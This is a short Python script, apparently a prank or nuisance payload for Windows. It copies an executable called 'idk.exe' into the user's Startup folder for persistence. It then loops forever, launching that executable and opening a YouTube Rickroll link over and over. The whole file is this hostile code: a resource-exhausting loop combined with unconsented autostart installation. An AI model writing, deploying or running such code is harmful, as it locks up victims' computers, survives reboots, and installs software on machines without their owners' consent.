import webbrowser
import os
import winshell
import shutil

startup = winshell.startup()

shutil.copy("idk.exe", startup)
while True:
    os.startfile('idk.exe')
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
